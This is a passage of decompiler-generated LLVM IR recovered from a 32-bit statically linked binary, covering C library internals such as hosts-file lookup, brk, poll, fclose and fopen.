  %v0_804c884 = load i32, i32* @edi, align 4
  %v4_804c885 = inttoptr i32 %v0_804c884 to i8*
  %v5_804c885 = call i32 @__GI_strcoll(i8* %v4_804c885, i32 ptrtoint ([7 x i8]* @global_var_8050820.93 to i32), i32 %v0_804c87d, i32 %v0_804c87d)
  store i32 %v5_804c885, i32* @eax, align 4
  %v1_804c88d = icmp eq i32 %v5_804c885, 0
  br i1 %v1_804c88d, label %dec_label_pc_804c8cf.preheader, label %dec_label_pc_804c891

dec_label_pc_804c891:                             ; preds = %dec_label_pc_804c87d
  %v0_804c891 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8050827.94 to i32), i32* %stack_var_-216, align 4
  %v0_804c898 = load i32, i32* @edi, align 4
  %v4_804c899 = inttoptr i32 %v0_804c898 to i8*
  %v5_804c899 = call i32 @__GI_strcoll(i8* %v4_804c899, i32 ptrtoint ([7 x i8]* @global_var_8050827.94 to i32), i32 %v0_804c891, i32 %v0_804c891)
  %v1_804c8a1 = icmp eq i32 %v5_804c899, 0
  br i1 %v1_804c8a1, label %dec_label_pc_804c8cf.preheader, label %dec_label_pc_804c912

dec_label_pc_804c8cf.preheader:                   ; preds = %dec_label_pc_804c87d, %dec_label_pc_804c891
  %v0_804c8cf96 = load i32, i32* @global_var_8054998.87, align 8
  %tmp4399 = icmp slt i32 %v0_804c8cf96, 1
  %tmp44100 = icmp eq i1 %tmp4399, false
  br i1 %tmp44100, label %dec_label_pc_804c8a7, label %dec_label_pc_804c8d8

dec_label_pc_804c8a7:                             ; preds = %dec_label_pc_804c8cf.preheader, %dec_label_pc_804c8a7.dec_label_pc_804c8a7_crit_edge
  %v0_804c8cf101 = phi i32 [ %v0_804c8cf, %dec_label_pc_804c8a7.dec_label_pc_804c8a7_crit_edge ], [ %v0_804c8cf96, %dec_label_pc_804c8cf.preheader ]
  %v1_804c8a7 = add i32 %v0_804c8cf101, -1
  %v1_804c8ab = mul i32 %v1_804c8a7, 4
  %v2_804c8ab = add i32 %v1_804c8ab, 134564216
  %v3_804c8ab = inttoptr i32 %v2_804c8ab to i32*
  %v4_804c8ab = load i32, i32* %v3_804c8ab, align 4
  store i32 %v1_804c8a7, i32* @global_var_8054998.87, align 8
  %v1_804c8b7 = call i32 @free(i32 %v4_804c8ab)
  %v0_804c8bc = load i32, i32* @global_var_8054998.87, align 8
  %v1_804c8c4 = mul i32 %v0_804c8bc, 4
  %v2_804c8c4 = add i32 %v1_804c8c4, ptrtoint (i32* @global_var_8054978.95 to i32)
  %v3_804c8c4 = inttoptr i32 %v2_804c8c4 to i32*
  store i32 0, i32* %v3_804c8c4, align 4
  %v0_804c8cf = load i32, i32* @global_var_8054998.87, align 8
  %tmp43 = icmp slt i32 %v0_804c8cf, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_804c8a7.dec_label_pc_804c8a7_crit_edge, label %dec_label_pc_804c8d8

dec_label_pc_804c8a7.dec_label_pc_804c8a7_crit_edge: ; preds = %dec_label_pc_804c8a7
  br label %dec_label_pc_804c8a7

dec_label_pc_804c8d8:                             ; preds = %dec_label_pc_804c8a7, %dec_label_pc_804c8cf.preheader
  %v0_804c8cf.lcssa = phi i32 [ %v0_804c8cf96, %dec_label_pc_804c8cf.preheader ], [ %v0_804c8cf, %dec_label_pc_804c8a7 ]
  store i32 1, i32* @esi, align 4
  %v5_804c905107 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_804c905107, label %dec_label_pc_804c907, label %dec_label_pc_804c912

dec_label_pc_804c8df:                             ; preds = %dec_label_pc_804c907
  %v2_804c8e2 = mul i32 %v0_804c8e9109, 4
  %v4_804c8e2 = add i32 %v2_804c8e2, %v3_804c84d
  %v5_804c8e2 = inttoptr i32 %v4_804c8e2 to i32*
  %v6_804c8e2 = load i32, i32* %v5_804c8e2, align 4
  %v1_804c8e9 = add i32 %v0_804c8e9109, 1
  store i32 %v1_804c8e9, i32* @esi, align 4
  %v1_804c8ea = inttoptr i32 %v6_804c8e2 to i8*
  %v2_804c8ea = call i32 @__GI_strdup(i8* %v1_804c8ea)
  %v1_804c8f2 = load i32, i32* @ebx, align 4
  %v2_804c8f2 = mul i32 %v1_804c8f2, 4
  %v3_804c8f2 = add i32 %v2_804c8f2, 134564216
  %v4_804c8f2 = inttoptr i32 %v3_804c8f2 to i32*
  store i32 %v2_804c8ea, i32* %v4_804c8f2, align 4
  %v0_804c8f9 = load i32, i32* @ebx, align 4
  %v1_804c8f9 = add i32 %v0_804c8f9, 1
  store i32 %v1_804c8f9, i32* @global_var_8054998.87, align 8
  %v0_804c901.pre = load i32, i32* @esi, align 4
  %v5_804c905 = icmp slt i32 %v0_804c901.pre, %stack_var_-196.0.lcssa
  br i1 %v5_804c905, label %dec_label_pc_804c907, label %dec_label_pc_804c912

dec_label_pc_804c907:                             ; preds = %dec_label_pc_804c8d8, %dec_label_pc_804c8df
  %v0_804c8e9109 = phi i32 [ %v0_804c901.pre, %dec_label_pc_804c8df ], [ 1, %dec_label_pc_804c8d8 ]
  %v0_804c907108 = phi i32 [ %v1_804c8f9, %dec_label_pc_804c8df ], [ %v0_804c8cf.lcssa, %dec_label_pc_804c8d8 ]
  store i32 %v0_804c907108, i32* @ebx, align 4
  %v7_804c910 = icmp sgt i32 %v0_804c907108, 3
  br i1 %v7_804c910, label %dec_label_pc_804c912, label %dec_label_pc_804c8df

dec_label_pc_804c912:                             ; preds = %dec_label_pc_804c79f.preheader, %dec_label_pc_804c79e, %dec_label_pc_804c8d8, %dec_label_pc_804c907, %dec_label_pc_804c8df, %dec_label_pc_804c891, %dec_label_pc_804c7c0, %dec_label_pc_804c7b7, %dec_label_pc_804c912.preheader
  %v0_804c912 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_804c919, i32* @ebx, align 4
  %v3_804c91e = call i32 @fgets(i32 %v2_804c919, i32 128, i32 %v0_804c912)
  store i32 %v3_804c91e, i32* @eax, align 4
  %v1_804c926 = icmp eq i32 %v3_804c91e, 0
  %v1_804c928 = icmp eq i1 %v1_804c926, false
  br i1 %v1_804c928, label %dec_label_pc_804c79f.preheader, label %dec_label_pc_804c92e

dec_label_pc_804c79f.preheader:                   ; preds = %dec_label_pc_804c912
  %v0_804c79f.pre = load i32, i32* @ebx, align 4
  %v4_804c79f.pre = load i32, i32* @ecx, align 4
  %v1_804c79f49 = inttoptr i32 %v0_804c79f.pre to i8*
  %v2_804c79f50 = load i8, i8* %v1_804c79f49, align 1
  %v3_804c79f51 = zext i8 %v2_804c79f50 to i32
  %v5_804c79f52 = and i32 %v4_804c79f.pre, -256
  %v6_804c79f53 = or i32 %v3_804c79f51, %v5_804c79f52
  store i32 %v6_804c79f53, i32* @ecx, align 4
  %v4_804c7a154 = icmp eq i8 %v2_804c79f50, 0
  br i1 %v4_804c7a154, label %dec_label_pc_804c912, label %dec_label_pc_804c7a9.lr.ph

dec_label_pc_804c7a9.lr.ph:                       ; preds = %dec_label_pc_804c79f.preheader
  %v0_804c7a9.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804c7a9

dec_label_pc_804c92e:                             ; preds = %dec_label_pc_804c912
  %v0_804c931 = load i32, i32* @ebp, align 4
  %v1_804c932 = inttoptr i32 %v0_804c931 to i16*
  %v2_804c932 = call i32 @__GI_fclose(i16* %v1_804c932)
  br label %dec_label_pc_804c947

dec_label_pc_804c93c:                             ; preds = %dec_label_pc_804c77b
  %v0_804c93c = call i32 @__GI___h_errno_location()
  %v1_804c941 = inttoptr i32 %v0_804c93c to i32*
  store i32 3, i32* %v1_804c941, align 4
  br label %dec_label_pc_804c947

dec_label_pc_804c947:                             ; preds = %entry, %dec_label_pc_804c92e, %dec_label_pc_804c93c
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_804c734, i32* @eax, align 4
  %v2_804c953 = call i32 @__pthread_return_void(i32 %v2_804c734, i32 1)
  store i32 %v0_804c720, i32* @ebp, align 4
  ret i32 %v2_804c953

; uselistorder directives
  uselistorder i32 %v0_804c7a9.pre, { 1, 0 }
  uselistorder i32 %v6_804c79f53, { 1, 0 }
  uselistorder i8 %v2_804c79f50, { 1, 2, 0 }
  uselistorder i8* %v1_804c79f49, { 1, 0 }
  uselistorder i32 %v0_804c79f.pre, { 1, 0 }
  uselistorder i32 %v0_804c8cf, { 0, 2, 1 }
  uselistorder i32 %v0_804c872, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_804c80a, { 1, 0 }
  uselistorder i32 %v2_804c7eb, { 1, 0 }
  uselistorder i32 %v1_804c7df, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804c7ae, { 1, 0 }
  uselistorder i32 %v1_804c79e, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32* @global_var_8054998.87, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_8054994.33, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8052160.32 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_804c947, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c912, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_804c907, { 1, 0 }
  uselistorder label %dec_label_pc_804c8a7, { 1, 0 }
  uselistorder label %dec_label_pc_804c8cf.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804c87d, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804c872, { 1, 0 }
  uselistorder label %dec_label_pc_804c828, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c821, { 1, 0 }
  uselistorder label %dec_label_pc_804c818, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c805, { 1, 0 }
  uselistorder label %dec_label_pc_804c7e6, { 1, 0 }
  uselistorder label %dec_label_pc_804c912.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_804c987 = inttoptr i32 %arg3 to i32*
  %v10_804c987 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_804c987, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_804c987
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804c993 = call i32 @__libc_getpid()
  %v2_804c99f = call i32 @kill(i32 %v0_804c993, i32 %arg1)
  ret i32 %v2_804c99f

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 1, 3, 2, 0 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_804c9a8 = load i32, i32* @eax, align 4
  %v1_804c9a8 = add i32 %v0_804c9a8, 28
  %v2_804c9a8 = inttoptr i32 %v1_804c9a8 to i32*
  %v3_804c9a8 = load i32, i32* %v2_804c9a8, align 4
  store i32 %v3_804c9a8, i32* @global_var_805499c.96, align 4
  %v1_804c9b1 = add i32 %v0_804c9a8, 44
  %v2_804c9b1 = inttoptr i32 %v1_804c9b1 to i32*
  %v3_804c9b1 = load i32, i32* %v2_804c9b1, align 4
  store i32 %v3_804c9b1, i32* @global_var_80549a0.97, align 32
  ret i32 %v3_804c9b1
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804c9bc = load i32, i32* @ebx, align 4
  store i32 %v0_804c9bc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_804c9cf = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_804c9cf, i32* @global_var_8052544.82, align 4
  %v7_804c9da = icmp ult i32 %v1_804c9cf, %arg1
  %v1_804c9dc = icmp eq i1 %v7_804c9da, false
  br i1 %v1_804c9dc, label %dec_label_pc_804c9ec, label %dec_label_pc_804c9de

dec_label_pc_804c9de:                             ; preds = %entry
  %v0_804c9de = load i32, i32* %stack_var_-4, align 4
  %v1_804c9de = call i32 @__errno_location(i32 %v0_804c9de)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804c9e6 = inttoptr i32 %v1_804c9de to i32*
  store i32 12, i32* %v1_804c9e6, align 4
  %v0_804c9ed.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804c9ec

dec_label_pc_804c9ec:                             ; preds = %entry, %dec_label_pc_804c9de
  %v0_804c9ed = phi i32 [ 0, %entry ], [ %v0_804c9ed.pre, %dec_label_pc_804c9de ]
  %v2_804c9f0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804c9f0, i32* @ebx, align 4
  ret i32 %v0_804c9ed

; uselistorder directives
  uselistorder i32 %v1_804c9cf, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8052544.82, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c9ec, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_804c9f7 = load i32, i32* @eax, align 4
  %v1_804c9f9 = sub i32 0, %v0_804c9f7
  %v1_804c9fb = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_804ca00 = inttoptr i32 %v1_804c9fb to i32*
  store i32 %v1_804c9f9, i32* %v2_804ca00, align 4
  ret i32 -1
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804ca0c = load i32, i32* @edi, align 4
  store i32 %v0_804ca0c, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_804ca1c = load i32, i32* @ebx, align 4
  %v1_804ca1d = inttoptr i32 %tmp4 to %pollfd*
  %v5_804ca24 = call i32 @poll(%pollfd* %v1_804ca1d, i32 %tmp3, i32 %tmp)
  store i32 %v0_804ca1c, i32* @ebx, align 4
  store i32 %v5_804ca24, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_804ca24, -4095
  br i1 %tmp10, label %dec_label_pc_804ca3c, label %dec_label_pc_804ca30

dec_label_pc_804ca30:                             ; preds = %entry
  %v1_804ca30 = call i32 @__errno_location(i32 %v0_804ca1c)
  %v0_804ca35 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ca35 = sub i32 0, %v0_804ca35
  %v2_804ca37 = inttoptr i32 %v1_804ca30 to i32*
  store i32 %v1_804ca35, i32* %v2_804ca37, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ca3c

dec_label_pc_804ca3c:                             ; preds = %entry, %dec_label_pc_804ca30
  %v0_804ca3d = phi i32 [ %v5_804ca24, %entry ], [ -1, %dec_label_pc_804ca30 ]
  %v2_804ca40 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ca40, i32* @edi, align 4
  ret i32 %v0_804ca3d

; uselistorder directives
  uselistorder i32 %v5_804ca24, { 1, 0, 2 }
  uselistorder i32 %v0_804ca1c, { 1, 0 }
  uselistorder label %dec_label_pc_804ca3c, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_804ca4b = ptrtoint i16* %arg1 to i32
  store i32 %v4_804ca4b, i32* @esi, align 4
  %v1_804ca4f = add i32 %v4_804ca4b, 52
  %v2_804ca4f = inttoptr i32 %v1_804ca4f to i32*
  %v3_804ca4f = load i32, i32* %v2_804ca4f, align 4
  store i32 %v3_804ca4f, i32* @ebp, align 4
  %v1_804ca52 = icmp eq i32 %v3_804ca4f, 0
  %v1_804ca54 = icmp eq i1 %v1_804ca52, false
  br i1 %v1_804ca54, label %dec_label_pc_804ca75, label %dec_label_pc_804ca56

dec_label_pc_804ca56:                             ; preds = %entry
  %v1_804ca56 = add i32 %v4_804ca4b, 56
  store i32 %v1_804ca56, i32* @ebx, align 4
  %v2_804ca60 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ca60, i32* @eax, align 4
  %v2_804ca65 = call i32 @__pthread_return_void(i32 %v2_804ca60, i32 134526871)
  %v0_804ca6a = load i32, i32* @ebx, align 4
  %v1_804ca6d = call i32 @__pthread_return_0(i32 %v0_804ca6a)
  store i32 %v1_804ca6d, i32* @eax, align 4
  %v0_804ca77.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ca75

dec_label_pc_804ca75:                             ; preds = %entry, %dec_label_pc_804ca56
  %v0_804ca7f = phi i32 [ %v4_804ca4b, %entry ], [ %v0_804ca77.pre, %dec_label_pc_804ca56 ]
  store i32 0, i32* @edi, align 4
  %v1_804ca77 = inttoptr i32 %v0_804ca7f to i8*
  %v2_804ca77 = load i8, i8* %v1_804ca77, align 1
  %v3_804ca77 = and i8 %v2_804ca77, 64
  %v4_804ca77 = icmp eq i8 %v3_804ca77, 0
  br i1 %v4_804ca77, label %dec_label_pc_804ca75.dec_label_pc_804ca8a_crit_edge, label %dec_label_pc_804ca7c

dec_label_pc_804ca75.dec_label_pc_804ca8a_crit_edge: ; preds = %dec_label_pc_804ca75
  br label %dec_label_pc_804ca8a

dec_label_pc_804ca7c:                             ; preds = %dec_label_pc_804ca75
  %v1_804ca80 = inttoptr i32 %v0_804ca7f to i16*
  %v2_804ca80 = call i32 @fflush_unlocked(i16* %v1_804ca80)
  store i32 %v2_804ca80, i32* @edi, align 4
  %v0_804ca8d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ca8a

dec_label_pc_804ca8a:                             ; preds = %dec_label_pc_804ca75.dec_label_pc_804ca8a_crit_edge, %dec_label_pc_804ca7c
  %v0_804ca8d = phi i32 [ %v0_804ca7f, %dec_label_pc_804ca75.dec_label_pc_804ca8a_crit_edge ], [ %v0_804ca8d.pre, %dec_label_pc_804ca7c ]
  %v1_804ca8d = add i32 %v0_804ca8d, 4
  %v2_804ca8d = inttoptr i32 %v1_804ca8d to i32*
  %v3_804ca8d = load i32, i32* %v2_804ca8d, align 4
  %v1_804ca90 = call i32 @__libc_close(i32 %v3_804ca8d)
  %v0_804ca98 = load i32, i32* @esi, align 4
  %v1_804ca98 = add i32 %v0_804ca98, 4
  %v2_804ca98 = inttoptr i32 %v1_804ca98 to i32*
  store i32 -1, i32* %v2_804ca98, align 4
  %v2_804caa9 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804caa9, i32* @ebx, align 4
  %v2_804caae = icmp slt i32 %v1_804ca90, 0
  store i32 -1, i32* @eax, align 4
  %v1_804cab5 = load i32, i32* @edi, align 4
  %v3_804cab5 = select i1 %v2_804caae, i32 -1, i32 %v1_804cab5
  store i32 %v3_804cab5, i32* @edi, align 4
  %v2_804cab8 = call i32 @__pthread_return_void(i32 %v2_804caa9, i32 134526871)
  %v1_804cac4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  %v0_804cac9 = load i32, i32* @global_var_8052548.99, align 8
  %v1_804cace = add i32 %v0_804cac9, 1
  store i32 %v1_804cace, i32* @global_var_8052548.99, align 8
  store i32 ptrtoint (i32* @global_var_80521a8.98 to i32), i32* @eax, align 4
  %v2_804cad9 = call i32 @__pthread_return_void(i32 %v2_804caa9, i32 1)
  %v0_804cade = load i32, i32* @esi, align 4
  %v1_804cade = inttoptr i32 %v0_804cade to i32*
  %v2_804cade = load i32, i32* %v1_804cade, align 4
  %v1_804cae3 = and i32 %v2_804cade, 24576
  %v1_804cae8 = or i32 %v1_804cae3, 48
  store i32 %v1_804cae8, i32* @eax, align 4
  %v1_804caed = trunc i32 %v1_804cae8 to i16
  %v3_804caed = inttoptr i32 %v0_804cade to i16*
  store i16 %v1_804caed, i16* %v3_804caed, align 2
  br i1 %v1_804ca54, label %dec_label_pc_804cb03, label %dec_label_pc_804caf2

dec_label_pc_804caf2:                             ; preds = %dec_label_pc_804ca8a
  %v2_804caf6 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804caf6, i32* @eax, align 4
  %v2_804cafb = call i32 @__pthread_return_void(i32 %v2_804caf6, i32 1)
  store i32 %v2_804cafb, i32* @eax, align 4
  br label %dec_label_pc_804cb03

dec_label_pc_804cb03:                             ; preds = %dec_label_pc_804ca8a, %dec_label_pc_804caf2
  %v0_804cb03 = load i32, i32* @esi, align 4
  %v1_804cb03 = add i32 %v0_804cb03, 1
  %v2_804cb03 = inttoptr i32 %v1_804cb03 to i8*
  %v3_804cb03 = load i8, i8* %v2_804cb03, align 1
  %v4_804cb03 = and i8 %v3_804cb03, 64
  %v5_804cb03 = icmp eq i8 %v4_804cb03, 0
  br i1 %v5_804cb03, label %dec_label_pc_804cb17, label %dec_label_pc_804cb09

dec_label_pc_804cb09:                             ; preds = %dec_label_pc_804cb03
  %v1_804cb0c = add i32 %v0_804cb03, 8
  %v2_804cb0c = inttoptr i32 %v1_804cb0c to i32*
  %v3_804cb0c = load i32, i32* %v2_804cb0c, align 4
  %v1_804cb0f = call i32 @free(i32 %v3_804cb0c)
  store i32 %v1_804cb0f, i32* @eax, align 4
  br label %dec_label_pc_804cb17

dec_label_pc_804cb17:                             ; preds = %dec_label_pc_804cb03, %dec_label_pc_804cb09
  %v2_804cb23 = call i32 @__pthread_return_void(i32 %v2_804caa9, i32 134526871)
  %v1_804cb2f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  store i32 ptrtoint (i32* @global_var_80521a8.98 to i32), i32* @eax, align 4
  %v0_804cb35 = load i32, i32* @global_var_805254c.100, align 4
  %v1_804cb35 = add i32 %v0_804cb35, 1
  store i32 %v1_804cb35, i32* @global_var_805254c.100, align 4
  %v2_804cb3f = call i32 @__pthread_return_void(i32 %v2_804caa9, i32 1)
  %v0_804cb44 = call i32 @_stdio_openlist_dec_use()
  %v0_804cb4c = load i32, i32* @edi, align 4
  ret i32 %v0_804cb4c

; uselistorder directives
  uselistorder i32 %v2_804caa9, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32)* @__libc_close, { 4, 3, 2, 1, 5, 0 }
  uselistorder label %dec_label_pc_804cb17, { 1, 0 }
  uselistorder label %dec_label_pc_804cb03, { 1, 0 }
  uselistorder label %dec_label_pc_804ca8a, { 1, 0 }
  uselistorder label %dec_label_pc_804ca75, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804cb63 = inttoptr i32 %arg2 to i8*
  %v5_804cb63 = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_804cb63, i32 0, i32 -1)
  ret i32 %v5_804cb63
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804cb6c = load i32, i32* @ebp, align 4
  %v0_804cb6d = load i32, i32* @edi, align 4
  %v0_804cb6e = load i32, i32* @esi, align 4
  %v0_804cb6f = load i32, i32* @ebx, align 4
  store i32 %v0_804cb6f, i32* %stack_var_-16, align 4
  %v4_804cb73 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804cb73, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_804cb83 = load i8, i8* %arg2, align 1
  %v3_804cb83 = zext i8 %v2_804cb83 to i32
  %v4_804cb83 = load i32, i32* @eax, align 4
  %v5_804cb83 = and i32 %v4_804cb83, -256
  %v6_804cb83 = or i32 %v5_804cb83, %v3_804cb83
  store i32 %v6_804cb83, i32* %eax.global-to-local, align 4
  %v10_804cb85 = icmp eq i8 %v2_804cb83, 114
  br i1 %v10_804cb85, label %dec_label_pc_804cbc7, label %dec_label_pc_804cb89

dec_label_pc_804cb89:                             ; preds = %entry
  %v10_804cb89 = icmp eq i8 %v2_804cb83, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_804cb89, label %dec_label_pc_804cbc9, label %dec_label_pc_804cb92

dec_label_pc_804cb92:                             ; preds = %dec_label_pc_804cb89
  %v10_804cb92 = icmp eq i8 %v2_804cb83, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_804cb92, label %dec_label_pc_804cbc9, label %dec_label_pc_804cb9a

dec_label_pc_804cb9a:                             ; preds = %dec_label_pc_804cc42, %dec_label_pc_804cc1c, %dec_label_pc_804cb92
  %v0_804cb9a = load i32, i32* %stack_var_-16, align 4
  %v1_804cb9a = call i32 @__errno_location(i32 %v0_804cb9a)
  store i32 %v1_804cb9a, i32* %eax.global-to-local, align 4
  %v0_804cb9f = load i32, i32* @ebp, align 4
  %v1_804cb9f = icmp eq i32 %v0_804cb9f, 0
  %v1_804cba1 = inttoptr i32 %v1_804cb9a to i32*
  store i32 22, i32* %v1_804cba1, align 4
  br i1 %v1_804cb9f, label %dec_label_pc_804cda3, label %dec_label_pc_804cbad

dec_label_pc_804cbad:                             ; preds = %dec_label_pc_804cc65, %dec_label_pc_804cb9a
  %v0_804cbad = load i32, i32* @ebp, align 4
  %v1_804cbad = add i32 %v0_804cbad, 1
  %v2_804cbad = inttoptr i32 %v1_804cbad to i8*
  %v3_804cbad = load i8, i8* %v2_804cbad, align 1
  %v4_804cbad = and i8 %v3_804cbad, 32
  %v5_804cbad = icmp eq i8 %v4_804cbad, 0
  br i1 %v5_804cbad, label %dec_label_pc_804cda3, label %dec_label_pc_804cbb7

dec_label_pc_804cbb7:                             ; preds = %dec_label_pc_804cbad
  store i32 %v0_804cbad, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_804cbbd = call i32 @free(i32 %v0_804cbad)
  br label %dec_label_pc_804cd9e

dec_label_pc_804cbc7:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804cbc9

dec_label_pc_804cbc9:                             ; preds = %dec_label_pc_804cb92, %dec_label_pc_804cb89, %dec_label_pc_804cbc7
  %v0_804cbda = phi i32 [ 1089, %dec_label_pc_804cb92 ], [ 577, %dec_label_pc_804cb89 ], [ 0, %dec_label_pc_804cbc7 ]
  %v1_804cbc9 = add i32 %v4_804cb73, 1
  %v2_804cbc9 = inttoptr i32 %v1_804cbc9 to i8*
  %v3_804cbc9 = load i8, i8* %v2_804cbc9, align 1
  %v12_804cbc9 = icmp eq i8 %v3_804cbc9, 98
  %v1_804cbc9.v4_804cb73 = select i1 %v12_804cbc9, i32 %v1_804cbc9, i32 %v4_804cb73
  store i32 %v1_804cbc9.v4_804cb73, i32* %eax.global-to-local, align 4
  %v1_804cbd4 = add i32 %v1_804cbc9.v4_804cb73, 1
  %v2_804cbd4 = inttoptr i32 %v1_804cbd4 to i8*
  %v3_804cbd4 = load i8, i8* %v2_804cbd4, align 1
  %v12_804cbd4 = icmp eq i8 %v3_804cbd4, 43
  %v1_804cbd8 = icmp eq i1 %v12_804cbd4, false
  br i1 %v1_804cbd8, label %dec_label_pc_804cbe2, label %dec_label_pc_804cbda

dec_label_pc_804cbda:                             ; preds = %dec_label_pc_804cbc9
  %v1_804cbdc = or i32 %v0_804cbda, 1
  store i32 %v1_804cbdc, i32* %eax.global-to-local, align 4
  %v1_804cbdf = add nuw nsw i32 %v1_804cbdc, 1
  store i32 %v1_804cbdf, i32* @ebx, align 4
  br label %dec_label_pc_804cbe2

dec_label_pc_804cbe2:                             ; preds = %dec_label_pc_804cbc9, %dec_label_pc_804cbda
  %v0_804cc658 = phi i32 [ %v0_804cbda, %dec_label_pc_804cbc9 ], [ %v1_804cbdf, %dec_label_pc_804cbda ]
  %v1_804cbe2 = icmp eq i32 %arg3, 0
  %v1_804cbe4 = icmp eq i1 %v1_804cbe2, false
  br i1 %v1_804cbe4, label %dec_label_pc_804cc18, label %dec_label_pc_804cbe6

dec_label_pc_804cbe6:                             ; preds = %dec_label_pc_804cbe2
  store i32 80, i32* %stack_var_-76, align 4
  %v1_804cbeb = call i32 @malloc(i32 80)
  store i32 %v1_804cbeb, i32* %eax.global-to-local, align 4
  %v2_804cbf3 = icmp eq i32 %v1_804cbeb, 0
  store i32 %v1_804cbeb, i32* @ebp, align 4
  br i1 %v2_804cbf3, label %dec_label_pc_804cda5, label %dec_label_pc_804cbfd

dec_label_pc_804cbfd:                             ; preds = %dec_label_pc_804cbe6
  %v2_804cbeb = inttoptr i32 %v1_804cbeb to i16*
  store i16 8192, i16* %v2_804cbeb, align 2
  %v2_804cc05 = add i32 %v1_804cbeb, 8
  %v3_804cc05 = inttoptr i32 %v2_804cc05 to i32*
  store i32 0, i32* %v3_804cc05, align 4
  %v2_804cc0c = add i32 %v1_804cbeb, 56
